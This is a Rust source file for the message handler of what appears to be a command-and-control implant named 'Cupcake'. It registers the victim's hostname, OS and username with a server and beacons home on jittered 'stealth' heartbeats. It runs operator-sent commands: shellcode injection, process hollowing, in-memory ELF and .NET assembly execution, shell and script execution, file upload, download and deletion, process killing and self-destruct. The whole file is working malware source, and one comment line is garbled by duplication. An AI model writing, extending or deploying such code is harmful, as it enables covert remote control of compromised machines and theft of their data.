// Batch Message Handler Module
//
// Optimized message handler with asynchronous plugin execution and result buffering.
// This handler ensures that plugin execution doesn't block the main heartbeat loop
// and provides network resilience through result buffering.

use crate::error::{ClientError, Result};
use crate::executor::CommandExecutor;
use crate::transport::Transport;
use crate::types::{CommandPayload, CommandResult, MessageType, MessageWrapper, SystemInfo};
use crate::plugin_router::{BatchExecutionManager, BatchConfig, BufferedResult, PluginRouter};
use log::{debug, error, info, warn};
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{Duration, Instant};

/// Optimized message handler with batch execution support
/// 
/// This handler provides:
/// - Non-blocking plugin execution
/// - Result buffering for network resilience
/// - Automatic retry and flush mechanisms
/// - Heartbeat preservation during heavy plugin execution
pub struct BatchMessageHandler {
    /// Transport layer (trait object)
    transport: Box<dyn Transport>,
    /// Batch execution manager
    batch_manager: Arc<BatchExecutionManager>,
    /// Last successful network communication timestamp
    last_network_success: Arc<Mutex<Instant>>,
    /// Network health status
    network_healthy: Arc<Mutex<bool>>,
    /// Receiver for execution results from background tasks
    result_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<BufferedResult>>,
}

impl BatchMessageHandler {
    /// Create new batch message handler
    /// 
    /// # Parameters
    /// 
    /// * `transport` - Transport layer implementation
    /// * `batch_config` - Configuration for batch execution
    pub fn new(transport: Box<dyn Transport>, batch_config: Option<BatchConfig>) -> Self {
        let config = batch_config.unwrap_or_default();
        let (result_tx, result_rx) = tokio::sync::mpsc::unbounded_channel();
        
        let batch_manager = Arc::new(BatchExecutionManager::new(config));
        
        // Use a weak pointer to avoid potential cycles if the callback was more complex,
        // but here we just need to send data to the main loop.
        let result_tx = Arc::new(result_tx);
        
        // Set the callback in the batch manager
        {
            let tx = Arc::clone(&result_tx);
            batch_manager.set_network_callback(Arc::new(move |results| {
                let tx = Arc::clone(&tx);
                tokio::spawn(async move {
                    if let Err(e) = tx.send(results) {
                        error!("Failed to send results to main loop: {}", e);
                        false
                    } else {
                        true
                    }
                })
            }));
        }
        
        Self {
            transport,
            batch_manager,
            last_network_success: Arc::new(Mutex::new(Instant::now())),
            network_healthy: Arc::new(Mutex::new(true)),
            result_rx,
        }
    }
    
    /// Run optimized message processing loop
    /// 
    /// This method provides:
    /// 1. Non-blocking plugin execution
    /// 2. Heartbeat preservation
    /// 3. Network resilience with buffering
    /// 4. Automatic retry mechanisms
    pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
        // Step 1: Send registration message
        if let Err(e) = self.register().await {
            error!("Failed to register: {}", e);
            return Err(e);
        }
        
        // Step 2: Start background tasks
        self.start_background_tasks().await;
        
        // Step 3: Enter optimized message loop
        info!("🚀 Entering optimized message loop with batch execution...");
        
        let base_interval = crate::config::get_heartbeat_interval();
        let interval_secs = if base_interval == 0 { 30 } else { base_interval };
        let jitter_percent = 50;

        loop {
            let receive_timeout = Duration::from_millis(100);
            
            // ⚡ STEALTH: Calculate next jittered heartbeat
            let jitter_range = (interval_secs * jitter_percent / 100).max(5);
            let jitter = crate::utils::random_range(0, jitter_range as u32);
            let final_delay = if crate::utils::random_bool(0.5) {
                interval_secs + jitter as u64
            } else {
                interval_secs.saturating_sub(jitter as u64).max(10)
            };

            crate::utils::db_print(&format!("[Cupcake] Batch loop active. Next heartbeat in {}s", final_delay));
            tokio::select! {
                // Scenario 1: Receive message from server
                recv_res = tokio::time::timeout(receive_timeout, self.transport.receive()) => {
                    match recv_res {
                        Ok(Ok(data)) => {
                            if data.is_empty() {
                                warn!("Connection closed by server");
                                return Ok(self.transport);
                            }
                            self.update_network_health(true).await;
                            if let Err(e) = self.handle_message_async(&data).await {
                                error!("Error handling message: {}", e);
                            }
                        }
                        Ok(Err(e)) => {
                            error!("Transport error: {}", e);
                            self.update_network_health(false).await;
                            return Ok(self.transport);
                        }
                        Err(_) => {
                            // Timeout - perform periodic tasks
                            self.perform_periodic_tasks().await;
                        }
                    }
                }
                
                // Scenario 2: Background execution results arrived
                Some(results) = self.result_rx.recv() => {
                    info!("📤 Sending {} buffered execution results to server", results.len());
                    for buffered in results {
                        let response_msg = buffered.result.to_response_message();
                        let _ = self.send_message(&response_msg).await;
                    }
                }

                // Scenario 3: Heartbeat time!
                _ = crate::stealth::stealth_sleep(final_delay as u32 * 1000) => {
                    let heartbeat_res = CommandResult {
                        stdout: String::new(),
                        stderr: String::new(),
                        path: None,
                        req_id: Some("heartbeat".to_string()),
                    };
                    
                    if let Err(_) = self.send_message(&heartbeat_res.to_response_message()).await {
                        warn!("Heartbeat send failed, connection might be dead");
                    }
                }
            }
        }
    }
    
    /// Send registration message
    async fn register(&mut self) -> Result<()> {
        info!("Collecting system information...");
        
        let sys_info = SystemInfo::collect();
        info!("Registered with UUID: {}", sys_info.uuid);
        info!("Hostname: {}", sys_info.hostname);
        info!("OS: {}", sys_info.os);
        info!("Username: {}", sys_info.username);
        
        // Initialize transport
        self.transport.initialize(&sys_info.uuid);
        
        // Send registration message
        let register_msg = sys_info.to_register_message();
        self.send_message(&register_msg).await?;
        
        info!("Registration message sent successfully");
        Ok(())
    }
    
    /// Handle message asynchronously (non-blocking)
    async fn handle_message_async(&mut self, data: &[u8]) -> Result<()> {
        // Convert to string
        let text = String::from_utf8(data.to_vec())
            .map_err(|e| ClientError::ConnectionError(
                format!("Invalid UTF-8 in received message: {}", e)
            ))?;
        
        debug!("Received message: {}", text);
        
        // Deserialize message
        let wrapper: MessageWrapper = match serde_json::from_str(&text) {
            Ok(w) => w,
            Err(e) => {
                error!("Failed to deserialize message: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        // Handle based on message type
        match wrapper.msg_type {
            MessageType::Command => {
                // Handle command asynchronously
                self.handle_command_async(wrapper).await?;
            }
            MessageType::Register => {
                warn!("Received unexpected Register message from server");
            }
            MessageType::Response => {
                warn!("Received unexpected Response message from server");
            }
        }
        
        Ok(())
    }
    
    /// Handle command asynchronously (non-blocking for plugin execution)
    async fn handle_command_async(&mut self, wrapper: MessageWrapper) -> Result<()> {
        // Parse command payload
        let command_payload: CommandPayload = match serde_json::from_value(wrapper.payload) {
            Ok(p) => p,
            Err(e) => {
                error!("Failed to parse command payload: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        info!(
            "Received command: type={}, content={}, req_id={:?}",
            command_payload.command_type, command_payload.command_content, command_payload.req_id
        );
        
        let _req_id = command_payload.req_id.clone();
        
        // Route command execution
        match command_payload.command_type.as_str() {
            // Plugin execution types - route to batch manager (non-blocking)
            "execute_assembly" | "inject_shellcode" | "hollow_shellcode" | "run_memfd_elf" | 
            "shell_script" | "powershell_script" | "python_script" | "self_destruct" => {
                self.handle_plugin_command_async(command_payload).await?;
            }
            
            // Non-plugin commands - execute immediately (blocking but fast)
            "shell" => {
                let result = self.handle_shell_command(command_payload).await;
                self.send_result_immediately(result).await?;
            }
            
            // File operations - execute immediately
            "file_ls" | "file_upload" | "file_download" | "file_delete" => {
                let result = self.handle_file_command(command_payload).await;
                self.send_result_immediately(result).await?;
            }
            
            // Process operations - execute immediately
            "process_list" | "process_kill" => {
                let result = self.handle_process_command(command_payload).await;
                self.send_result_immediately(result).await?;
            }
            
            // HTTP operations - execute immediately
            "upload_http" | "download_http" => {
                let result = self.handle_http_command(command_payload).await;
                self.send_result_immediately(result).await?;
            }
            
            _ => {
                warn!("Unsupported command type: {}, ignoring", command_payload.command_type);
            }
        }
        
        Ok(())
    }
    
    /// Handle plugin command asynchronously (non-blocking)
    async fn handle_plugin_command_async(&mut self, command_payload: CommandPayload) -> Result<()> {
        // Map command types to plugin execution types
        let execution_type = match command_payload.command_type.as_str() {
            "execute_assembly" => "execute-assembly",
            "inject_shellcode" => "inject-shellcode", 
            "hollow_shellcode" => "hollow-shellcode",
            "run_memfd_elf" => "memfd-exec",
            "shell_script" => "shell-script",
            "powershell_script" => "powershell-script",
            "python_script" => "python-script",
            "self_destruct" => "self-destruct",
            _ => return Err(ClientError::ConnectionError(format!("Unknown plugin type: {}", command_payload.command_type))),
        };
        
        // Parse plugin task
        let req_id_clone = command_payload.req_id.clone();
        match PluginRouter::parse_plugin_task(execution_type, &command_payload.command_content, req_id_clone) {
            Ok(task) => {
                info!("🚀 Submitting plugin task to batch manager: {}", task.task_id);
                
                // Submit to batch manager (non-blocking)
                match self.batch_manager.submit_task(task).await {
                    Ok(task_id) => {
                        info!("✅ Plugin task submitted successfully: {}", task_id);
                        // Task is now executing in background, results will be buffered
                    }
                    Err(e) => {
                        error!("❌ Failed to submit plugin task: {}", e);
                        // Send immediate error response
                        let error_result = CommandResult {
                            stdout: String::new(),
                            stderr: format!("Failed to submit plugin task: {}", e),
                            path: None,
                            req_id: command_payload.req_id.clone(),
                        };
                        self.send_result_immediately(error_result).await?;
                    }
                }
            }
            Err(e) => {
                error!("❌ Failed to parse plugin task: {}", e);
                let error_result = CommandResult {
                    stdout: String::new(),
                    stderr: e,
                    path: None,
                    req_id: command_payload.req_id.clone(),
                };
                self.send_result_immediately(error_result).await?;
            }
        }
        
        Ok(())
    }
    
    /// Handle shell command (immediate execution)
    async fn handle_shell_command(&self, command_payload: CommandPayload) -> CommandResult {
        let clean_cmd = command_payload.command_content.trim();
        if clean_cmd.is_empty() || clean_cmd.starts_with('{') {
            debug!("Silently dropping heartbeat/control message: {}", command_payload.command_content);
            return CommandResult {
                stdout: String::new(),
                stderr: String::new(),
                path: None,
                req_id: command_payload.req_id,
            };
        }
        
        // Handle delete command
        if clean_cmd.starts_with("delete ") {
            let target_path = clean_cmd.trim_start_matches("delete ").trim();
            if target_path.is_empty() {
                return CommandResult {
                    stdout: String::new(),
                    stderr: "Delete path is empty".to_string(),
                    path: None,
                    req_id: command_payload.req_id,
                };
            } else {
                info!("Deleting path via shell command: {}", target_path);
                match crate::fs::remove(target_path) {
                    Ok(_) => CommandResult {
                        stdout: format!("[+] Deleted: {}", target_path),
                        stderr: String::new(),
                        path: None,
                        req_id: command_payload.req_id,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("[ERR] Delete failed: {}", e),
                        path: None,
                        req_id: command_payload.req_id,
                    },
                }
            }
        } else {
            let mut result = CommandExecutor::execute(clean_cmd).await;
            result.req_id = command_payload.req_id;
            result
        }
    }
    
    /// Handle file command (immediate execution)
    async fn handle_file_command(&self, command_payload: CommandPayload) -> CommandResult {
        let mut result = match command_payload.command_type.as_str() {
            "file_ls" => {
                let target_path = command_payload.path.as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                match crate::fs::ls(target_path) {
                    Ok(json) => CommandResult {
                        stdout: json,
                        stderr: String::new(),
                        path: Some(target_path.to_string()),
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to list directory: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            "file_upload" => {
                if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                    match crate::fs::upload(path, data) {
                        Ok(_) => CommandResult { stdout: format!("Uploaded: {}", path), stderr: String::new(), path: None, req_id: None },
                        Err(e) => CommandResult { stdout: String::new(), stderr: format!("Upload failed: {}", e), path: None, req_id: None },
                    }
                } else {
                    CommandResult { stdout: String::new(), stderr: "Missing parameters".into(), path: None, req_id: None }
                }
            }
            "file_download" => {
                let target_path = command_payload.path.as_deref().unwrap_or(&command_payload.command_content);
                match crate::fs::download(target_path) {
                    Ok(b64) => CommandResult { stdout: b64, stderr: String::new(), path: None, req_id: None },
                    Err(e) => CommandResult { stdout: String::new(), stderr: format!("Download failed: {}", e), path: None, req_id: None },
                }
            }
            "file_delete" => {
                let target_path = command_payload.path.as_deref().unwrap_or(&command_payload.command_content);
                match crate::fs::remove(target_path) {
                    Ok(_) => CommandResult { stdout: format!("Deleted: {}", target_path), stderr: String::new(), path: None, req_id: None },
                    Err(e) => CommandResult { stdout: String::new(), stderr: format!("Delete failed: {}", e), path: None, req_id: None },
                }
            }
            _ => CommandResult {
                stdout: String::new(),
                stderr: format!("File command {} not supported", command_payload.command_type),
                path: None,
                req_id: None,
            },
        };
        
        result.req_id = command_payload.req_id;
        result
    }
    
    /// Handle process command (imme    /// Handle process command (immediate execution - native version)
    async fn handle_process_command(&self, command_payload: CommandPayload) -> CommandResult {
        let mut result = match command_payload.command_type.as_str() {
            "process_list" => {
                #[cfg(target_os = "windows")]
                {
                    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS};
                    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
                    use winapi::shared::minwindef::TRUE;

                    let mut processes = Vec::new();
                    unsafe {
                        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                        if snapshot != INVALID_HANDLE_VALUE {
                            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
                            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

                            if Process32FirstW(snapshot, &mut entry) == TRUE {
                                loop {
                                    let name = String::from_utf16_lossy(&entry.szExeFile).trim_matches('\0').to_string();
                                    processes.push(serde_json::json!({
                                        "pid": entry.th32ProcessID,
                                        "ppid": entry.th32ParentProcessID,
                                        "name": name,
                                        "user": "",
                                        "path": "",
                                        "arch": "x64",
                                    }));
                                    if Process32NextW(snapshot, &mut entry) != TRUE { break; }
                                }
                            }
                            CloseHandle(snapshot);
                        }
                    }
                    CommandResult {
                        stdout: serde_json::to_string(&processes).unwrap_or_else(|_| "[]".to_string()),
                        stderr: String::new(),
                        path: None,
                        req_id: None,
                    }
                }
                
                #[cfg(not(target_os = "windows"))]
                {
                    // Minimal fallback for non-windows
                    CommandResult {
                        stdout: "[]".to_string(),
                        stderr: "Process listing not implemented for this platform in batch handler".to_string(),
                        path: None,
                        req_id: None,
                    }
                }
            }
            "process_kill" => {
                let pid_str = command_payload.command_content.trim();
                if let Ok(pid_u32) = pid_str.parse::<u32>() {
                    #[cfg(target_os = "windows")]
                    {
                        use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
                        use winapi::um::winnt::PROCESS_TERMINATE;
                        use winapi::um::handleapi::CloseHandle;
                        use winapi::shared::minwindef::FALSE;

                        unsafe {
                            let h = OpenProcess(PROCESS_TERMINATE, FALSE, pid_u32);
                            if !h.is_null() {
                                let res = TerminateProcess(h, 1);
                                CloseHandle(h);
                                if res != FALSE {
                                    CommandResult { stdout: format!("Process {} terminated", pid_str), stderr: String::new(), path: None, req_id: None }
                                } else {
                                    CommandResult { stdout: String::new(), stderr: "Failed to kill process".to_string(), path: None, req_id: None }
                                }
                            } else {
                                CommandResult { stdout: String::new(), stderr: "Process not found or access denied".to_string(), path: None, req_id: None }
                            }
                        }
                    }
                    #[cfg(not(target_os = "windows"))]
                    {
                        CommandResult { stdout: String::new(), stderr: "Kill not implemented".to_string(), path: None, req_id: None }
                    }
                } else {
                    CommandResult { stdout: String::new(), stderr: "Invalid PID".to_string(), path: None, req_id: None }
                }
            }
            _ => CommandResult {
                stdout: String::new(),
                stderr: format!("Process command {} not implemented", command_payload.command_type),
                path: None,
                req_id: None,
            },
        };
        
        result.req_id = command_payload.req_id;
        result
    }
    
    /// Handle HTTP command (immediate execution)
    async fn handle_http_command(&self, command_payload: CommandPayload) -> CommandResult {
        // Implement HTTP command handling (upload, download)
        let mut result = CommandResult {
            stdout: String::new(),
            stderr: format!("HTTP command {} not implemented in batch handler", command_payload.command_type),
            path: None,
            req_id: None,
        };
        
        result.req_id = command_payload.req_id;
        result
    }
    
    /// Send result immediately (for non-plugin commands)
    async fn send_result_immediately(&mut self, result: CommandResult) -> Result<()> {
        let response_msg = result.to_response_message();
        self.send_message(&response_msg).await
    }
    
    /// Send message through transport
    async fn send_message(&mut self, message: &MessageWrapper) -> Result<()> {
        let json = serde_json::to_string(message)
            .map_err(|e| ClientError::SerializationError(e))?;
        
        match self.transport.send(json.as_bytes()).await {
            Ok(_) => {
                self.update_network_health(true).await;
                Ok(())
            }
            Err(e) => {
                self.update_network_health(false).await;
                Err(e)
            }
        }
    }
    
    /// Update network health status
    async fn update_network_health(&self, healthy: bool) {
        let mut network_healthy = self.network_healthy.lock().await;
        let mut last_success = self.last_network_success.lock().await;
        
        if healthy {
            *network_healthy = true;
            *last_success = Instant::now();
        } else {
            *network_healthy = false;
        }
    }
    
    /// Start background tasks
    async fn start_background_tasks(&self) {
        let batch_manager_weak = Arc::downgrade(&self.batch_manager);
        let network_healthy_weak = Arc::downgrade(&self.network_healthy);
        
        // Background task for periodic buffer flushing
        tokio::spawn(async move {
            let mut flush_interval = tokio::time::interval(Duration::from_secs(10));
            
            loop {
                flush_interval.tick().await;
                
                // If parent handler was dropped due to disconnect, exit the background task
                let batch_manager = match batch_manager_weak.upgrade() {
                    Some(arc) => arc,
                    None => {
                        info!("🛑 Background flush task exiting (session closed)");
                        break;
                    }
                };
                
                let network_healthy = match network_healthy_weak.upgrade() {
                    Some(arc) => arc,
                    None => break,
                };
                
                // Check if network is healthy before flushing
                let is_healthy = *network_healthy.lock().await;
                if is_healthy {
                    let (buffer_size, _) = batch_manager.get_buffer_status().await;
                    if buffer_size > 0 {
                        info!("🔄 Background flush: {} buffered results", buffer_size);
                        batch_manager.flush_buffer().await;
                    }
                } else {
                    debug!("⏸️ Skipping buffer flush due to network issues");
                }
            }
        });
    }
    
    /// Perform periodic maintenance tasks
    async fn perform_periodic_tasks(&self) {
        // Check buffer status
        let (buffer_size, max_size) = self.batch_manager.get_buffer_status().await;
        if buffer_size > max_size / 2 {
            debug!("📊 Buffer status: {}/{} ({}%)", buffer_size, max_size, (buffer_size * 100) / max_size);
        }
        
        // Force flush if buffer is getting full and network is healthy
        let is_healthy = *self.network_healthy.lock().await;
        if is_healthy && buffer_size > (max_size * 3) / 4 {
            info!("🚨 Buffer nearly full, forcing flush: {}/{}", buffer_size, max_size);
            self.batch_manager.flush_buffer().await;
        }
    }
}